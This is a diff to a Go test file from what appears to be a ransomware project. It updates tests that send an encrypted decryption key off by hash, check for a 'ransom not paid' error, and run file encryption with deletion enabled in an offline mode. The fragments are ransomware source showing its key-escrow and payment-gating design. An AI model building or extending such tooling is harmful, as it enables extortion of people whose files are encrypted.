@@ -193,7 +193,7 @@ func TestSendoffAndReceiveKey(t *testing.T) {
 	pubKeyBytes, _ := hex.DecodeString(key)
 	pubKey := string(pubKeyBytes)
 	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
-	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus)
+	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus, false)
 	if err != nil {
 		t.Error(err.Error())
 	}
@@ -201,7 +201,7 @@ func TestSendoffAndReceiveKey(t *testing.T) {
 		t.Error("Sendoff failed!")
 	}
 	// retrieve key
-	keyHex, err := utils.RetriveKeyByHash(hash)
+	keyHex, err := utils.RetriveKeyByHash(hash, false)
 	if err != nil {
 		t.Error(err.Error())
 	}
@@ -220,7 +220,7 @@ func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
 	pubKeyBytes, _ := hex.DecodeString(key)
 	pubKey := string(pubKeyBytes)
 	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
-	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus)
+	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus, false)
 	if err != nil {
 		t.Error(err.Error())
 	}
@@ -228,7 +228,7 @@ func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
 		t.Error("Sendoff failed!")
 	}
 	// retrieve key
-	_, err = utils.RetriveKeyByHash(hash)
+	_, err = utils.RetriveKeyByHash(hash, false)
 	if err != nil {
 		if err.Error() != "ransom not paid" {
 			t.Error("Unexpected error")
@@ -246,6 +246,7 @@ func TestOfflineDecryption(t *testing.T) {
 	cli.Settings.Delete = true
 	cli.Settings.RawKey = false
 	cli.Settings.PaidStatus = true
+	cli.Settings.OfflineMode = true
 	StartEncryption(&dQue, key)
 	for _, f := range files {
 		_, b := os.Stat(f)
